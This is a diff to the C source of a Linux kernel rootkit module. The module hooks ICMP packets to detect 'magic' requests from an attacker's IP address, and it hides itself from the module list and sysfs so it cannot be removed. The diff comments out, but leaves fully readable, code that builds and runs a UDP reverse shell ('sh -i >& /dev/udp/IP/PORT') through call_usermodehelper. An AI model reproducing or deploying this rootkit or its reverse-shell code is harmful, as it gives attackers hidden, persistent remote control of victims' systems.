@@ -32,7 +32,8 @@
 #include <linux/types.h>
 #include <linux/udp.h>
 #include <linux/unistd.h>
-#include <linux/workqueue.h>
+// Remnants of rev_shell
+// #include <linux/workqueue.h>
 #include <linux/version.h>
 #include <net/inet_sock.h>
 #include "khook/engine.c"
@@ -56,10 +57,11 @@ typedef struct legacy_timer_emu {
 typedef struct timer_list _timer;
 #endif
 
-typedef struct shell_command_task {
-	struct work_struct work;
-	char* command;
-} shell_command_task;
+// Remnants of rev_shell
+// typedef struct shell_command_task {
+// 	struct work_struct work;
+// 	char* command;
+// } shell_command_task;
 
 // TODO: Extract this to an h file to avoid duplication.
 #define GET_ROOT 0
@@ -79,16 +81,19 @@ typedef struct task_from_controller {
  * Global defines and variables.
  */
 
-#define INIT_WORK_QUEUE(_task, _func) INIT_WORK((_task), (_func))
 #define POLLING_INTERVAL 1500
 #define MAGIC_ROOT_NUM 31337
 #define MAX_TASK_SIZE 200
-#define WORKQUEUE_NAME "garden/0"
+
+// Remnants of rev_shell
+// #define INIT_WORK_QUEUE(_task, _func) INIT_WORK((_task), (_func))
+// #define WORKQUEUE_NAME "garden"
+// struct workqueue_struct* shell_work_queue;
 
 static _timer polling_timer;
 static struct nf_hook_ops icmp_hook;
 static __be32 attacker_ip = 0;
-struct workqueue_struct* shell_work_queue;
+
 
 // Module parameters
 
@@ -331,7 +336,7 @@ static void do_something_on_interval(unsigned long data) {
 }
 
 /**
- * Work queue functions
+ * Work queue functions. For reverse shell.
  */
 
 /**
@@ -339,66 +344,66 @@ static void do_something_on_interval(unsigned long data) {
  * and execute code there. We define the environment the command will execute
  * in and run it.
  */
-void run_shell_command(char* run_cmd) {
-	static char* envp[] = {
-		"HOME=/",
-		"TERM=linux",
-		"PATH=/sbin:/usr/sbin:/bin:/usr/bin",
-		NULL
-	};
+// void run_shell_command(char* run_cmd) {
+// 	static char* envp[] = {
+// 		"HOME=/",
+// 		"TERM=linux",
+// 		"PATH=/sbin:/usr/sbin:/bin:/usr/bin",
+// 		NULL
+// 	};
 
-	char** argv = kmalloc(sizeof(char* [5]), GFP_KERNEL);
+// 	char** argv = kmalloc(sizeof(char* [5]), GFP_KERNEL);
 
-	if (!argv) {
-		return -ENOMEM;
-	}
+// 	if (!argv) {
+// 		return -ENOMEM;
+// 	}
 
-	argv[0] = "/bin/sh";
-	argv[1] = "-c";
-	argv[2] = run_cmd;
-	argv[3] = NULL;
+// 	argv[0] = "/bin/sh";
+// 	argv[1] = "-c";
+// 	argv[2] = run_cmd;
+// 	argv[3] = NULL;
 
-	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
-}
+// 	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+// }
 
-int add_shell_task_to_queue(char* cmd) {
-	struct shell_command_task* task;
-	task = kmalloc(sizeof(shell_command_task*), GFP_KERNEL);
+// int add_shell_task_to_queue(char* cmd) {
+// 	struct shell_command_task* task;
+// 	task = kmalloc(sizeof(shell_command_task*), GFP_KERNEL);
 
-	if (!task) {
-		return -1;
-	}
+// 	if (!task) {
+// 		return -1;
+// 	}
 
-	INIT_WORK_QUEUE(&task->work, &run_shell_command);
-	task->command = cmd;
-	return queue_work(shell_work_queue, &task->work);
-}
+// 	INIT_WORK_QUEUE(&task->work, &run_shell_command);
+// 	task->command = cmd;
+// 	return queue_work(shell_work_queue, &task->work);
+// }
 
 /**
  * Builds the command: $ echo "sh -i >& /dev/udp/IP/PORT 0>1&" | bash
  *
  * This command is responsible for opening a reverse shell.
  */
-char* create_reverse_shell_cmd(void) {
-	// Prepare to assemble string
-	char* beginning, *ending, *cmd;
-	int max_ip_port_len;
-	max_ip_port_len = 16 + 5 + 1; // 16 chars for IP, 5 for port, 1 for /
-	beginning = "echo 'sh -i >& /dev/udp/";
-	ending = " 0>1&' | bash";
+// char* create_reverse_shell_cmd(void) {
+// 	// Prepare to assemble string
+// 	char* beginning, *ending, *cmd;
+// 	int max_ip_port_len;
+// 	max_ip_port_len = 16 + 5 + 1; // 16 chars for IP, 5 for port, 1 for /
+// 	beginning = "echo 'sh -i >& /dev/udp/";
+// 	ending = " 0>1&' | bash";
 
-	// Put it all together
-	cmd = kcalloc(1, strlen(beginning) + strlen(ending) + max_ip_port_len + 1, GFP_KERNEL);
-	strncat(cmd, beginning, strlen(beginning));
-	strncat(cmd, rev_shell_ip, strlen(rev_shell_ip));
-	strncat(cmd, "/", 1);
-	strncat(cmd, rev_shell_port, strlen(rev_shell_port));
-	strncat(cmd, ending, strlen(ending));
-	return cmd;
-}
+// 	// Put it all together
+// 	cmd = kcalloc(1, strlen(beginning) + strlen(ending) + max_ip_port_len + 1, GFP_KERNEL);
+// 	strncat(cmd, beginning, strlen(beginning));
+// 	strncat(cmd, rev_shell_ip, strlen(rev_shell_ip));
+// 	strncat(cmd, "/", 1);
+// 	strncat(cmd, rev_shell_port, strlen(rev_shell_port));
+// 	strncat(cmd, ending, strlen(ending));
+// 	return cmd;
+// }
 
 /**
- * Net filter hook option for intercepting magic packets to
+ * NetFilter hook option for intercepting magic packets to
  * look for reverse shell requests. This tutorial was incredibly helpful
  * as I was putting this together: https://www.drkns.net/kernel-who-does-magic/
  **/
@@ -409,7 +414,7 @@ unsigned int icmp_hook_func(const struct nf_hook_ops* ops,
                             int (*okfn)(struct sk_buff*)) {
 	struct iphdr* ip_header;
 
-	printk(KERN_EMERG "ICMP HOOK hit");
+	printk(KERN_INFO "ICMP HOOK hit");
 
 	if (!socket_buff) {
 		goto accept;
@@ -428,10 +433,11 @@ unsigned int icmp_hook_func(const struct nf_hook_ops* ops,
 
 		if (attacker_ip == ip_header->saddr) {
 			char* cmd;
-			printk(KERN_EMERG "Reverse shell request found!\n");
-			cmd = create_reverse_shell_cmd();
-			printk(KERN_INFO "Running: %s", cmd);
-			add_shell_task_to_queue(cmd);
+			printk(KERN_INFO "Reverse shell request found!\n");
+			// Remnants of rev_shell
+			// cmd = create_reverse_shell_cmd();
+			// printk(KERN_INFO "Running: %s", cmd);
+			// add_shell_task_to_queue(cmd);
 		}
 	}
 
@@ -439,6 +445,10 @@ accept:
 	return NF_ACCEPT;
 }
 
+/**
+ * Registers hook into NetFilter for ICMP packets. This hook is called before any
+ * other hooks have a chance to look at the packet.
+ */
 static void icmp_hook_init(void) {
 	icmp_hook.hook = (void*) icmp_hook_func;
 	icmp_hook.pf = PF_INET; // Filter by IPV4 protocol family.
@@ -448,7 +458,7 @@ static void icmp_hook_init(void) {
 	if (nf_register_net_hook(&init_net, &icmp_hook)) {
 		printk(KERN_ERR "There was an issue registering ICMP hook.\n");
 	} else {
-		printk(KERN_ERR "Registered ICMP hook.\n");
+		printk(KERN_INFO "Registered ICMP hook.\n");
 	}
 }
 
@@ -456,14 +466,15 @@ static void icmp_hook_init(void) {
  * Rootkit module initialization.
  */
 static int __init rootkit_init(void) {
-	printk(KERN_EMERG "Initializing rootkit...\n");
+	printk(KERN_INFO "Initializing rootkit...\n");
 	khook_init();
 
-	printk(KERN_EMERG "Initializing ICMP hook...\n");
+	printk(KERN_INFO "Initializing ICMP hook...\n");
 	icmp_hook_init();
 
-	printk(KERN_EMERG "Initializing work queue....\n");
-	shell_work_queue = create_workqueue(WORKQUEUE_NAME);
+	// Remnants of rev_shell
+	// printk(KERN_INFO "Initializing work queue....\n");
+	// shell_work_queue = create_workqueue(WORKQUEUE_NAME);
 
 	// If reverse shell IP input, convert it to a numeric representation
 	// for comparison in the hook.
@@ -471,12 +482,12 @@ static int __init rootkit_init(void) {
 		attacker_ip = in_aton(rev_shell_ip);
 	}
 
-	printk(KERN_EMERG "Initializing timer...\n");
+	printk(KERN_INFO "Initializing timer...\n");
 	timer_init_wrapper(&polling_timer, do_something_on_interval);
 	set_timer(&polling_timer);
 
 	if (block_removal) {
-		printk(KERN_EMERG "Blocking removal and hiding rootkit...\n");
+		printk(KERN_INFO "Blocking removal and hiding rootkit...\n");
 		list_del_init(&__this_module.list);
 		kobject_del(&THIS_MODULE->mkobj.kobj);
 	}
@@ -494,9 +505,10 @@ static void __exit rootkit_exit(void) {
 	// Kill khook
 	khook_cleanup();
 
-	// Kill workqueue
-	flush_workqueue(shell_work_queue);
-	destroy_workqueue(shell_work_queue);
+	// Remnants of rev_shell
+	// // Kill workqueue
+	// flush_workqueue(shell_work_queue);
+	// destroy_workqueue(shell_work_queue);
 
 	// Remove ICMP hook
 	nf_unregister_net_hook(&init_net, &icmp_hook);
